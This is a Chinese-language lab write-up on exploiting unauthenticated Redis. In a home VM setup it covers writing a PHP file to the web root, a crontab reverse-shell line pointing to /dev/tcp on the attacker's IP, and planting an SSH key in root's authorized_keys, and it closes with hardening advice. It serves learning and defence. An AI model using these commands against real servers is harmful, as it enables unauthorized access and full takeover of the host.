由于在SSRF中涉及到了攻击Redis服务,于是就只能想把这个Redis的未授权访问漏洞先学了

# 什么是Redis未授权访问漏洞

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

所以,Redis未授权访问漏洞的产生条件就有两点

```
1. Redis绑定在0.0.0.0:6379，且没有采取添加防火墙规则避免其他非信任来源ip访问的策略
2. 没有设置密码认证,攻击者可以免密码登陆Redis服务
```

# 漏洞危害

1. 攻击者可以直接访问到内部数据并且无需认证,会导致敏感信息泄露
2. 攻击者可以执行命令，向web目录下写入webshell或者清空数据
3. 攻击者可以反弹shell至自己的vps
4. 如果Redis是以root身份运行的,那么攻击者还可以向服务器写入ssh公钥文件,直接通过ssh登陆服务器

# kali搭建Redis服务

安装下载Redis

```
wget http://download.redis.io/releases/redis-4.0.11.tar.gz
tar -zxvf redis-4.0.11.tar.gz
cd redis-4.0.11
make
```

测试Redis

```
cd src
./redis-server   启动
./redis-cli shutdown    关闭
```

![image-20210731172101160](images/1.png)

测试成功

修改Redis配置文件

```
vim redis-conf
```

```
注释该行，表示远程ip也可访问
#bind 127.0.0.1
修改运行时不受保护
protected-mode no
修该为守护进程/后台程序
daemonize yes
修改密码123456 
requirepass 123456
```



![image-20210731172607383](images/2.png)

```
redis-server ../redis.conf  启动时加载配置文件
```

查看是否启动了Redis

```
netstat -panut
```

![image-20210731174356582](images/3.png)

可以看到0.0.0.0:6379开启了

用nmap探测端口是否开启

```
nmap -A -p 6379 --script redis-info 192.168.121.129
```

![image-20210731174714663](images/4.png)

这是设置了密码的

如果存在未授权访问漏洞则会在上述输出界面的基础上再输出一个redis-info信息

![image-20210731175927911](images/5.png)

这是没有设置密码的,存在未授权访问漏洞

# Redis基本操作

info查看配置信息

![image-20210731180255211](images/6.png)

kali是./redis-cli -h ip

ubantu是redis-cli -h ip连接Redis服务

![image-20210731195521092](images/7.png)

KEYS *查看所以键值

![image-20210731180359198](images/8.png)

flushall用来删除数据库

获取默认的redis目录、和rdb文件名：可在修改前先获取，离开时再恢复。

![image-20210731180621946](images/9.png)

设置变量值

![image-20210731180642342](images/10.png)

# 利用Redis攻击

## 利用Redis的未授权访问漏洞写webshell

利用条件:

```
1.靶机redis链接未授权，在攻击机上能用redis-cli连上，且未登陆验证 

2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 （我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）
```

这里我选择把shell写到我的网站根目录下面

```
config set dir /var/www/html
```

命名为shell.php

```
config set dbfilename shell.php
```

向shell.php中写入内容

```
set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
```

\r\n\r\n表示换行,因为用Redis写入的文件会自带一些版本信息，如果不换行代码很有可能执行不了

最后save一下

![image-20210731191639156](images/11.png)

可以看到,shell.php已经写入了

访问一下

![image-20210731191749482](images/12.png)

## 利用crontab反弹shell

利用条件:以root身份运行

我在kali上开一个监听nc -lvp 2333

连接一下ubantu的Redis服务./redis-cli -h 192.168.121.132

执行命令

```
set xxx "\n\n/* * * * /bin/bash -i>&/dev/tcp/192.168.121.129/2333 0>&1\n\n"
config set dir /var/spool/cron 写入计划任务,到时间时会自动反弹shell
config set dbfilename root
save
```

![image-20210731201417828](images/13.png)

不过这里不知道为什么,在我的ubantu上,文件创建和写入都成功了,不过就是没有反弹shell

我又想把kali的shell反弹到ubantu上,于是反过来做了一遍,kali上也可以写入,但是也没有反弹shell,我就bash执行了一下文件,还是不行

不知道是不是因为我ubantu登陆的用户不是root,但是运行redis的时候是以root权限运行的

终于在大佬博客看到了原因https://xz.aliyun.com/t/5665#toc-8

这个方法只能`Centos`上使用，`Ubuntu上行不通`，原因如下：

1. 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件`/var/spool/cron/crontabs/<username>`权限必须是600也就是`-rw-------`才会执行，否则会报错`(root) INSECURE MODE (mode 0600 expected)`，而Centos的定时任务文件`/var/spool/cron/<username>`权限644也能执行
2. 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错

## 写入ssh公钥然后登陆

利用条件

```
Redis服务使用root账号启动
服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。
```

这里靶机我选择的是kali,攻击机是ubantu

输入命令mkdir /root/.ssh创建ssh公钥的存放目录

在ubantu中输入ssh-keygen -t rsa来生成ssh公钥和私钥,密码设置为空

我在kali中生成密钥的图片

![image-20210731222121634](images/14.png)

在ssh目录下查看刚刚生成的公钥

```
cd /root/.ssh
ls
cat id_rsa.pub
```

用redis服务连接kali,将公钥写入kali的ssh目录下

```
redis-cli -h 192.168.121.129
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJuOG2dJaJBUTyQZamUxETnfpZ8l7Rtq3UyeqXMzkQfV6PwEzgpoGvdELSh4qRcnu6qB7AabAArqZwMbsE5Ne2keR0ITsfKLYCZKWr1MoTbDZUmjc6SAYOJB8b4j/t1900EpXPhA2zQK9J1fn0VNgEXr/7hyxcKhgP7gcEBCmCqZUGK7kFq1sfu+JKCMQpxg+N9B2G/U4Ny1scb6OXPNyspvK8kI+V7i8gwRCxnekEBe+2zQs3+BK7b/UkDiXaGR73PMk7gV25h0JUr/rT69eX2rBNmb17x4wmDQ20RCgzWsj97w+pPGnJp4FdWu9fs5Ri6BbHOuKeqY4q8Z/iSVyN root@ubuntu\n\n\n"
save
```

![image-20210731225812938](images/15.png)

利用ssh私钥登陆

```
ssh -i id_rsa root@192.168.121.129
```

![image-20210731225834321](images/16.png)

如果连接不上kali的ssh服务,可以去网上搜搜如何开启kali的ssh服务



# 防御措施

## 修改配置文件redis.conf

把# bind 127.0.0.1前面的 注释#号去掉，然后把127.0.0.1改成允许访问你的redis服务器的ip地址，表示只允许该ip进行访问。这种情况下，我们在启动redis服务器的时候不能再用:redis-server

## 增加redis访问密码

在redis.conf中的#requirepass foobared注释去掉,并且将foobared改为我们需要设置的密码

## 修改默认端口

在redis.conf中把redis的默认端口port 6379可以改成一些不常用的端口号

参考: https://blog.csdn.net/chuhe163/article/details/113483485

https://xz.aliyun.com/t/5665#toc-8